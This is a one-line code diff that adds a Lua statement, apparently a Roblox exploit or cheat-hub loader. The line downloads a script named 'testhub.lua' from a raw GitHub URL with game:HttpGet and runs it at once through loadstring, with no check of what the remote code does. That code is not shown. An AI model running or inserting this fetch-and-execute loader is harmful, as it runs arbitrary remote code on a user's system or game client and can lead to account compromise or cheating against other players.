@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/camperweak-collab/test-hub/refs/heads/main/testhub.lua'))();
